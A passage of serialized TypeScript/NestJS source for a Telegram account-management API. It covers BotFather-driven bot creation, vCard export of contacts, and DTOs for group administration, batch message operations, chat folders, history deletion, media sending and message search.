provided, set it\n            if (options.aboutText) {\n                console.log('[BOT CREATION] Setting about text...');\n                await this.client.sendMessage(entity, { message: '/setabouttext' });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n\n                console.log(`[BOT CREATION] Selecting bot @${options.username} for about text update...`);\n                await this.client.sendMessage(entity, { message: `@${options.username}` });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n\n                console.log('[BOT CREATION] Sending about text...');\n                await this.client.sendMessage(entity, { message: options.aboutText });\n                await new Promise(resolve => setTimeout(resolve, 1000));\n                console.log('[BOT CREATION] About text set successfully');\n            }\n\n            // If profile photo URL is provided, set it\n            if (options.profilePhotoUrl) {\n                console.log(`[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);\n                try {\n                    console.log('[BOT CREATION] Downloading profile photo...');\n                    const photoBuffer = await this.downloadFileFromUrl(options.profilePhotoUrl);\n                    console.log(`[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);\n\n                    console.log('[BOT CREATION] Sending /setuserpic command...');\n                    await this.client.sendMessage(entity, { message: '/setuserpic' });\n                    await new Promise(resolve => setTimeout(resolve, 1000));\n\n                    console.log(`[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);\n                    await this.client.sendMessage(entity, { message: `@${options.username}` });\n                    await new Promise(resolve => setTimeout(resolve, 1000));\n\n                    console.log('[BOT CREATION] Uploading profile photo...');\n                    await this.client.sendFile(entity, {\n                        file: Buffer.from(photoBuffer),\n                        caption: '',\n                        forceDocument: false\n                    });\n                    await new Promise(resolve => setTimeout(resolve, 1000));\n                    console.log('[BOT CREATION] Profile photo set successfully');\n                } catch (photoError) {\n                    console.error(`[BOT CREATION] Failed to set profile photo: ${photoError.message}`);\n                    // Continue with bot creation even if photo upload fails\n                }\n            }\n\n            console.log(`[BOT CREATION] Bot creation completed successfully: @${options.username}`);\n            return {\n                botToken,\n                username: botUsername\n            };\n\n        } catch (error) {\n            console.error(`[BOT CREATION] Error during bot creation process: ${error.message}`, error);\n            throw new Error(`Failed to create bot: ${error.message}`);\n        }\n    }\n\n    private createVCardContent(contacts: Api.contacts.Contacts): string {\n        let vCardContent = '';\n        contacts.users.map((user: Api.TypeUser) => {\n            user = user as Api.User;\n            vCardContent += 'BEGIN:VCARD\\n';\n            vCardContent += 'VERSION:3.0\\n';\n            vCardContent += `FN:${user.firstName || ''} ${user.lastName || ''}\\n`;\n            vCardContent += `TEL;TYPE=CELL:${user.phone}\\n`;\n            vCardContent += 'END:VCARD\\n';\n        }\n        );\n        return vCardContent;\n    }\n\n    async sendContactsFile(chatId: string, contacts: Api.contacts.Contacts, filename = 'contacts.vcf'): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n\n        try {\n            const vCardContent = this.createVCardContent(contacts);\n            const tempPath = `./contacts/${chatId}-${filename}`;\n\n            // Ensure the directory exists\n            if (!fs.existsSync('./contacts')) {\n                fs.mkdirSync('./contacts', { recursive: true });\n            }\n\n            // Write vCard content to a temporary file\n            fs.writeFileSync(tempPath, vCardContent, 'utf8');\n\n            try {\n                // Read the file content for sending\n                const fileContent = fs.readFileSync(tempPath);\n\n                // Send file with the actual content\n                const file = new CustomFile(\n                    filename,\n                    fs.statSync(tempPath).size,\n                    tempPath,\n                    fileContent // Add the actual file content\n                );\n\n                await this.client.sendFile(chatId, {\n                    file,\n                    caption: `Contacts file with ${contacts.users.length} contacts`,\n                    forceDocument: true\n                });\n\n                console.log(`Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);\n            } finally {\n                // Clean up temp file\n                if (fs.existsSync(tempPath)) {\n                    fs.unlinkSync(tempPath);\n                }\n            }\n        } catch (error) {\n            console.error('Error sending contacts file:', error);\n            throw error; // Re-throw the error for proper handling by caller\n        }\n    }\n}\nexport default TelegramManager;\n","import { Injectable } from '@nestjs/common';\r\n\r\n@Injectable()\r\nexport class TelegramValidationConfig {\r\n    static readonly PHONE_PATTERN = /^\\+?[1-9]\\d{1,14}$/;\r\n    static readonly USERNAME_PATTERN = /^[a-zA-Z0-9_]{5,32}$/;\r\n    static readonly MESSAGE_MAX_LENGTH = 4096;\r\n    static readonly CAPTION_MAX_LENGTH = 1024;\r\n    static readonly FILE_SIZE_LIMIT = 2000 * 1024 * 1024; // 2000MB\r\n    static readonly BATCH_SIZE_LIMIT = 100;\r\n    \r\n    static readonly ALLOWED_MEDIA_TYPES = [\r\n        'photo',\r\n        'video',\r\n        'document',\r\n        'voice',\r\n        'audio'\r\n    ];\r\n\r\n    static readonly ALLOWED_PRIVACY_LEVELS = [\r\n        'everybody',\r\n        'contacts',\r\n        'nobody'\r\n    ];\r\n\r\n    static readonly MESSAGE_TYPES = [\r\n        'all',\r\n        'text',\r\n        'photo',\r\n        'video',\r\n        'voice',\r\n        'document'\r\n    ];\r\n\r\n    static readonly DEFAULT_PAGINATION = {\r\n        limit: 20,\r\n        maxLimit: 100\r\n    };\r\n}","import { IsString, IsOptional, IsNumber, IsArray, IsEnum, ArrayMinSize, ArrayMaxSize } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform } from 'class-transformer';\r\n\r\nexport enum BatchOperationType {\r\n  FORWARD = 'forward',\r\n  DELETE = 'delete',\r\n  EDIT = 'edit'\r\n}\r\n\r\n// Base class for batch operations\r\nexport class BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Chat ID for the operation' })\r\n  @IsString()\r\n  chatId: string;\r\n}\r\n\r\nexport class BatchItemDto extends BaseBatchItemDto {\r\n  @ApiProperty({ description: 'Message ID for message operations', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  messageId?: number;\r\n\r\n  @ApiProperty({ description: 'Source chat ID for forward operations', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  fromChatId?: string;\r\n\r\n  @ApiProperty({ description: 'Target chat ID for forward operations', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  toChatId?: string;\r\n}\r\n\r\nexport class BatchProcessDto {\r\n  @ApiProperty({ description: 'Operation type', enum: BatchOperationType })\r\n  @IsEnum(BatchOperationType)\r\n  operation: BatchOperationType;\r\n\r\n  @ApiProperty({ description: 'Items to process', type: [BatchItemDto] })\r\n  @IsArray()\r\n  items: BatchItemDto[];\r\n\r\n  @ApiProperty({ description: 'Number of items to process in each batch', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  batchSize?: number = 20;\r\n  @ApiProperty({ description: 'Delay between batches in milliseconds', default: 1000 })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  delayMs?: number = 1000;\r\n}\r\n\r\nexport class ForwardBatchDto {\r\n  @ApiProperty({ description: 'Source chat ID for forwarding' })\r\n  @IsString()\r\n  fromChatId: string;\r\n\r\n  @ApiProperty({ description: 'Target chat ID for forwarding' })\r\n  @IsString()\r\n  toChatId: string;\r\n\r\n  @ApiProperty({ description: 'Message IDs to forward', type: [Number] })\r\n  @IsArray()\r\n  @ArrayMinSize(1, { message: 'At least one message ID is required' })\r\n  @ArrayMaxSize(100, { message: 'Cannot forward more than 100 messages at once' })\r\n  @IsNumber({}, { each: true })\r\n  @Transform(({ value }) => Array.isArray(value) ? value.map(Number) : value)\r\n  messageIds: number[];\r\n}","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class ConnectionStatusDto {\r\n  @ApiProperty({ description: 'Number of active connections' })\r\n  activeConnections: number;\r\n\r\n  @ApiProperty({ description: 'Number of rate-limited connections' })\r\n  rateLimited: number;\r\n\r\n  @ApiProperty({ description: 'Total number of operations' })\r\n  totalOperations: number;\r\n}\r\nexport class ChatStatisticsDto {\r\n  @ApiProperty({ description: 'Total message count' })\r\n  totalMessages: number;\r\n\r\n  @ApiProperty({ description: 'Active member count' })\r\n  activeMembers: number;\r\n\r\n  @ApiProperty({ description: 'Message count by type' })\r\n  messageTypes: {\r\n    text: number;\r\n    photo: number;\r\n    video: number;\r\n    voice: number;\r\n    document: number;\r\n  };\r\n\r\n  @ApiProperty({ description: 'Most active hours', type: [Number] })\r\n  activeHours: number[];\r\n\r\n  @ApiProperty({ description: 'Activity trend percentage' })\r\n  activityTrend: number;\r\n}","import { IsString, IsOptional, IsArray, IsBoolean, IsEnum } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport type ExportFormat = 'vcard' | 'csv';\r\n\r\nexport class ContactGroupDto {\r\n  @ApiProperty({ description: 'Name of the contact group' })\r\n  @IsString()\r\n  name: string;\r\n\r\n  @ApiProperty({ description: 'User IDs to include in the group', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  userIds: string[];\r\n\r\n  @ApiProperty({ description: 'Optional description for the group' })\r\n  @IsOptional()\r\n  @IsString()\r\n  description?: string;\r\n}\r\n\r\nexport class ContactBlockListDto {\r\n  @ApiProperty({ description: 'User IDs to block/unblock', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  userIds: string[];\r\n\r\n  @ApiProperty({ description: 'Whether to block or unblock the users' })\r\n  @IsBoolean()\r\n  block: boolean;\r\n}\r\n\r\nexport class ContactExportImportDto {\r\n  @ApiProperty({ enum: ['vcard', 'csv'], description: 'Export format type' })\r\n  @IsEnum(['vcard', 'csv'] as const)\r\n  format: ExportFormat;\r\n\r\n  @ApiProperty({ description: 'Whether to include blocked contacts', required: false, default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  includeBlocked = false;\r\n}\r\n\r\nexport class ContactImportDto {\r\n  @ApiProperty({ description: 'Contacts to import', type: [Object] })\r\n  @IsArray()\r\n  contacts: Array<{\r\n    firstName: string;\r\n    lastName?: string;\r\n    phone: string;\r\n  }>;\r\n}\r\n\r\nexport class AddContactsDto {\r\n  @ApiProperty({ description: 'Phone numbers to add', type: [String] })\r\n  @IsArray()\r\n  @IsString({ each: true })\r\n  phoneNumbers: string[];\r\n\r\n  @ApiProperty({ description: 'Name prefix to use for added contacts' })\r\n  @IsString()\r\n  prefix: string;\r\n}","import { ApiProperty } from '@nestjs/swagger';\nimport { IsNotEmpty, IsString, IsOptional, MaxLength } from 'class-validator';\n\nexport class CreateBotDto {\n    @ApiProperty({\n        description: 'Name of the bot (required)',\n        example: 'MyAwesomeBot'\n    })\n    @IsNotEmpty()\n    @IsString()\n    @MaxLength(64)\n    name: string;\n\n    @ApiProperty({\n        description: 'Username for the bot (required)',\n        example: 'my_awesome_bot'\n    })\n    @IsNotEmpty()\n    @IsString()\n    @MaxLength(32)\n    username: string;\n\n    @ApiProperty({\n        description: 'Description of what your bot can do',\n        example: 'This bot helps you manage your tasks',\n        required: false\n    })\n    @IsOptional()\n    @IsString()\n    @MaxLength(512)\n    description?: string;\n\n    @ApiProperty({\n        description: 'What the bot can be used for',\n        example: 'Task Management, Reminders, Notes',\n        required: false\n    })\n    @IsOptional()\n    @IsString()\n    @MaxLength(512)\n    aboutText?: string;\n\n    @ApiProperty({\n        description: 'URL to the bot\\'s profile photo',\n        example: 'https://example.com/bot-photo.jpg',\n        required: false\n    })\n    @IsOptional()\n    @IsString()\n    profilePhotoUrl?: string;\n}\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport { IsArray, IsBoolean, IsNotEmpty, IsOptional, IsString } from 'class-validator';\r\n\r\nexport class CreateChatFolderDto {\r\n    @ApiProperty({ description: 'Name of the chat folder' })\r\n    @IsString()\r\n    @IsNotEmpty()\r\n    name: string;\r\n\r\n    @ApiProperty({ description: 'List of chat IDs to include in the folder' })\r\n    @IsArray()\r\n    @IsNotEmpty()\r\n    includedChats: string[];\r\n\r\n    @ApiProperty({ description: 'List of chat IDs to exclude from the folder', required: false })\r\n    @IsArray()\r\n    @IsOptional()\r\n    excludedChats?: string[];\r\n\r\n    @ApiProperty({ description: 'Include contacts in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeContacts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include non-contacts in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeNonContacts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include groups in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeGroups?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include broadcast channels in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeBroadcasts?: boolean;\r\n\r\n    @ApiProperty({ description: 'Include bots in the folder', required: false, default: true })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    includeBots?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude muted chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeMuted?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude read chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeRead?: boolean;\r\n\r\n    @ApiProperty({ description: 'Exclude archived chats from the folder', required: false, default: false })\r\n    @IsBoolean()\r\n    @IsOptional()\r\n    excludeArchived?: boolean;\r\n}","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsBoolean, IsInt, IsOptional, IsString } from 'class-validator';\n\nexport class DeleteHistoryDto {\n  @ApiProperty({\n    description: 'Username or peer ID of the chat whose history you want to delete',\n  })\n  @IsString()\n  peer: string;\n\n  @ApiPropertyOptional({\n    description: 'Deletes all messages with IDs less than or equal to this value',\n  })\n  @IsOptional()\n  @IsInt()\n  maxId?: number;\n\n  @ApiPropertyOptional({\n    description: 'If true, clears the history only for the current user without deleting for others',\n    default: true,\n  })\n  @IsOptional()\n  @IsBoolean()\n  justClear: boolean = true;\n\n  @ApiPropertyOptional({\n    description: 'If true, deletes the message history for all participants (if permitted)',\n    default: false,\n  })\n  @IsOptional()\n  @IsBoolean()\n  revoke: boolean = false;\n\n  @ApiPropertyOptional({\n    description: 'Minimum date (UNIX timestamp) for messages to be deleted',\n  })\n  @IsOptional()\n  @IsInt()\n  minDate?: number;\n\n  @ApiPropertyOptional({\n    description: 'Maximum date (UNIX timestamp) for messages to be deleted',\n  })\n  @IsOptional()\n  @IsInt()\n  maxDate?: number;\n}\n","import { IsString, IsOptional, IsNumber, IsBoolean, IsObject, ValidateNested, IsNotEmpty, IsEnum, IsDateString } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Type, Transform } from 'class-transformer';\r\n\r\nexport enum AdminPermission {\r\n  CHANGE_INFO = 'changeInfo',\r\n  POST_MESSAGES = 'postMessages',\r\n  EDIT_MESSAGES = 'editMessages',\r\n  DELETE_MESSAGES = 'deleteMessages',\r\n  BAN_USERS = 'banUsers',\r\n  INVITE_USERS = 'inviteUsers',\r\n  PIN_MESSAGES = 'pinMessages',\r\n  ADD_ADMINS = 'addAdmins',\r\n  ANONYMOUS = 'anonymous',\r\n  MANAGE_CALL = 'manageCall'\r\n}\r\n\r\nexport class AdminPermissionsDto {\r\n  @ApiProperty({ description: 'Permission to change group info', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  changeInfo?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to post messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  postMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to edit messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  editMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to delete messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  deleteMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to ban users', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  banUsers?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to invite users', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  inviteUsers?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to pin messages', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  pinMessages?: boolean = true;\r\n\r\n  @ApiProperty({ description: 'Permission to add new admins', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  addAdmins?: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Permission to remain anonymous', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  anonymous?: boolean = false;\r\n\r\n  @ApiProperty({ description: 'Permission to manage voice chats', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  manageCall?: boolean = true;\r\n}\r\n\r\n// Base class for group operations\r\nexport class BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Group ID' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  groupId: string;\r\n}\r\n\r\nexport class GroupMemberOperationDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Array of user IDs', type: [String] })\r\n  @IsString({ each: true })\r\n  members: string[];\r\n}\r\n\r\nexport class AdminOperationDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'User ID to promote/demote' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  userId: string;\r\n\r\n  @ApiProperty({ description: 'Whether to promote or demote', required: true })\r\n  @IsBoolean()\r\n  isPromote: boolean;\r\n\r\n  @ApiProperty({ description: 'Admin permissions', required: false })\r\n  @IsOptional()\r\n  @ValidateNested()\r\n  @Type(() => AdminPermissionsDto)\r\n  permissions?: AdminPermissionsDto;\r\n\r\n  @ApiProperty({ description: 'Custom admin rank/title', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  rank?: string;\r\n}\r\n\r\nexport class GroupSettingsDto extends BaseGroupOperationDto {\r\n  @ApiPropertyOptional({ description: 'Group title', required: false })\r\n  @IsString()\r\n  @IsOptional()\r\n  title?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group username', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group description', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  description?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Address or location of the group', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  address?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Slow mode delay in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  slowMode?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a megagroup', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  megagroup?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is for import', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  forImport?: boolean = false;\r\n\r\n  @ApiPropertyOptional({ description: 'Member restrictions', required: false })\r\n  @IsOptional()\r\n  @IsObject()\r\n  memberRestrictions?: {\r\n    sendMessages?: boolean;\r\n    sendMedia?: boolean;\r\n    sendStickers?: boolean;\r\n    sendGifs?: boolean;\r\n    sendGames?: boolean;\r\n    sendInline?: boolean;\r\n    embedLinks?: boolean;\r\n  };\r\n}\r\n\r\nexport class ChatCleanupDto extends BaseGroupOperationDto {\r\n  @ApiProperty({ description: 'Chat ID to clean up' })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  chatId: string;\r\n  @ApiProperty({ description: 'Delete messages before this date', required: false })\r\n  @IsOptional()\r\n  @IsDateString()\r\n  @Transform(({ value }) => value ? new Date(value) : undefined)\r\n  beforeDate?: Date;\r\n\r\n  @ApiProperty({ description: 'Only delete media messages', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  onlyMedia?: boolean;\r\n\r\n  @ApiProperty({ description: 'Exclude pinned messages', required: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  excludePinned?: boolean;\r\n}\r\n\r\nexport class createGroupDto {\r\n  @ApiProperty({ description: 'Group title', required: true })\r\n  @IsString()\r\n  @IsNotEmpty()\r\n  title: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Group description', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  about?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Address or location of the group', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  address?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Slow mode delay in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  slowMode?: number = 0;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a megagroup', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  megagroup?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is a broadcast', default: true })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  broadcast?: boolean = true;\r\n\r\n  @ApiPropertyOptional({ description: 'Whether the group is for import', default: false })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  forImport?: boolean = false;\r\n\r\n  @ApiPropertyOptional({ description: 'Member restrictions', required: false })\r\n  @IsOptional()\r\n  @IsObject()\r\n  memberRestrictions?: {\r\n    sendMessages?: boolean;\r\n    sendMedia?: boolean;\r\n    sendStickers?: boolean;\r\n    sendGifs?: boolean;\r\n    sendGames?: boolean;\r\n    sendInline?: boolean;\r\n    embedLinks?: boolean;\r\n  };\r\n}\r\n","// Core Types and Interfaces\r\nexport * from '../../../interfaces/telegram';\r\n\r\n// Base DTOs\r\nexport * from './batch-operations.dto';\r\nexport * from './media-operations.dto';\r\nexport * from './schedule-operations.dto';\r\nexport * from './metadata-operations.dto';\r\nexport * from './group-operations.dto';\r\nexport * from './contact-management.dto';\r\nexport * from './profile-settings.dto';\r\nexport * from './view-once-media.dto';\r\nexport * from './create-bot.dto';\r\n\r\n// Type Re-exports\r\nexport { BatchOperationType } from './batch-operations.dto';\r\nexport { MediaType } from './media-operations.dto';\r\nexport { AdminPermission } from './group-operations.dto';\r\nexport { ExportFormat } from './contact-management.dto';\r\n","import { IsString, IsOptional, IsNumber, IsArray, IsEnum, IsUrl, ValidateNested } from 'class-validator';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Transform, Type } from 'class-transformer';\r\n\r\nexport enum MediaType {\r\n  PHOTO = 'photo',\r\n  VIDEO = 'video',\r\n  DOCUMENT = 'document',\r\n  VOICE = 'voice',\r\n  AUDIO = 'audio'\r\n}\r\n\r\n// Base class for media operations\r\nexport class BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Chat ID for media operation' })\r\n  @IsString()\r\n  chatId: string;\r\n}\r\n\r\nexport class MediaSearchDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Media types to include', enum: MediaType, isArray: true })\r\n  @IsArray()\r\n  @IsEnum(MediaType, { each: true })\r\n  types: MediaType[];\r\n\r\n  @ApiProperty({ description: 'Message offset', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  offset?: number;\r\n\r\n  @ApiProperty({ description: 'Items per page', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  @Transform(({ value }) => parseInt(value))\r\n  limit?: number = 50;\r\n}\r\n\r\nexport class MediaFilterDto extends MediaSearchDto {\r\n  @ApiProperty({ description: 'Start date for filtering', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Transform(({ value }) => value ? new Date(value).toISOString() : undefined)\r\n  startDate?: string;\r\n\r\n  @ApiProperty({ description: 'End date for filtering', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  @Transform(({ value }) => value ? new Date(value).toISOString() : undefined)\r\n  endDate?: string;\r\n}\r\n\r\nexport class SendMediaDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'URL of the media file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Caption for the media', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n\r\n  @ApiProperty({ description: 'Filename for the media' })\r\n  @IsString()\r\n  filename: string;\r\n\r\n  @ApiProperty({ description: 'Type of media', enum: MediaType })\r\n  @IsEnum(MediaType)\r\n  type: MediaType;\r\n}\r\n\r\nexport class MediaAlbumItemDto {\r\n  @ApiProperty({ description: 'URL of the media file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Type of media', enum: MediaType })\r\n  @IsEnum(MediaType)\r\n  type: MediaType;\r\n\r\n  @ApiProperty({ description: 'Caption for the media item', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n}\r\n\r\nexport class SendMediaAlbumDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'Array of media items', type: [MediaAlbumItemDto] })\r\n  @IsArray()\r\n  @ValidateNested({ each: true })\r\n  @Type(() => MediaAlbumItemDto)\r\n  media: MediaAlbumItemDto[];\r\n}\r\n\r\nexport class VoiceMessageDto extends BaseMediaOperationDto {\r\n  @ApiProperty({ description: 'URL of the voice message file' })\r\n  @IsString()\r\n  @IsUrl()\r\n  url: string;\r\n\r\n  @ApiProperty({ description: 'Duration of voice message in seconds', required: false })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  duration?: number;\r\n\r\n  @ApiProperty({ description: 'Caption for the voice message', required: false })\r\n  @IsOptional()\r\n  @IsString()\r\n  caption?: string;\r\n}","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Type } from 'class-transformer';\r\nimport {\r\n  IsString,\r\n  IsOptional,\r\n  IsArray,\r\n  IsNumber,\r\n  IsEnum,\r\n  IsDate,\r\n  Min,\r\n  Max,\r\n  IsInt,\r\n  ValidateNested,\r\n  ArrayMinSize,\r\n  ArrayMaxSize\r\n} from 'class-validator';\r\n\r\n/**\r\n * Enum for message media types that can be searched\r\n */\r\nexport enum MessageMediaType {\r\n  ALL = 'all',\r\n  TEXT = 'text',\r\n  PHOTO = 'photo',\r\n  VIDEO = 'video',\r\n  VOICE = 'voice',\r\n  DOCUMENT = 'document',\r\n  ROUND_VIDEO = 'roundVideo',\r\n  ROUND_VOICE = 'roundVoice',\r\n  STICKER = 'sticker',\r\n  ANIMATION = 'animation',\r\n  CONTACT = 'contact',\r\n  MUSIC = 'music',\r\n  CHAT_PHOTO = 'chatPhoto',\r\n}\r\n\r\n/**\r\n * Enum for search scope\r\n */\r\nexport enum SearchScope {\r\n  CHAT = 'chat',\r\n  GLOBAL = 'global'\r\n}\r\n\r\n/**\r\n * DTO for search messages request\r\n */\r\nexport class SearchMessagesDto {\r\n  @ApiPropertyOptional({\r\n    description: 'Chat ID to search in (required for chat-specific search)',\r\n  })\r\n  @IsString()\r\n  @IsOptional()\r\n  chatId?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Search query string',\r\n  })\r\n  @IsString()\r\n  @IsOptional()\r\n  query?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Types of messages to search for',\r\n    enum: MessageMediaType,\r\n    isArray: true,\r\n    required: false,\r\n  })\r\n  @IsArray()\r\n  @IsEnum(MessageMediaType, { each: true })\r\n  @IsOptional()\r\n  types?: MessageMediaType[] = [MessageMediaType.ALL];\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Minimum message ID for filtering',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  minId?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Maximum message ID for filtering',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  maxId?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Maximum number of messages to retrieve',\r\n    minimum: 1,\r\n    maximum: 500,\r\n  })\r\n  @IsInt()\r\n  @Min(1)\r\n  @Max(500)\r\n  @IsOptional()\r\n  limit?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Offset ID for pagination',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  offsetId?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Offset date as Unix timestamp',\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  @IsOptional()\r\n  offsetDate?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Start date for filtering messages by date range',\r\n  })\r\n  @Type(() => Date)\r\n  @IsDate()\r\n  @IsOptional()\r\n  startDate?: Date;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'End date for filtering messages by date range',\r\n  })\r\n  @Type(() => Date)\r\n  @IsDate()\r\n  @IsOptional()\r\n  endDate?: Date;\r\n}\r\n\r\n/**\r\n * Interface for message search results by type\r\n */\r\nexport class MessageTypeResult {\r\n  @ApiProperty({\r\n    description: 'Array of message IDs matching the search criteria',\r\n    type: [Number],\r\n    example: [1001, 1005, 1010]\r\n  })\r\n  @IsArray()\r\n  @IsInt({ each: true })\r\n  messages: number[];\r\n\r\n  @ApiProperty({\r\n    description: 'Total count of messages matching the search criteria',\r\n    example: 3\r\n  })\r\n  @IsInt()\r\n  @Min(0)\r\n  total: number;\r\n\r\n  data?: any\r\n}\r\n\r\n/**\r\n * DTO for search messages response\r\n */\r\nexport class SearchMessagesResponseDto {\r\n  @ApiPropertyOptional({\r\n    description: 'All message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  all?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Text message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  @IsOptional()\r\n  text?: MessageTypeResult;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Photo message results',\r\n    type: MessageTypeResult\r\n  })\r\n  @ValidateNested()\r\n  @Type(() => MessageTypeResult)\r\n  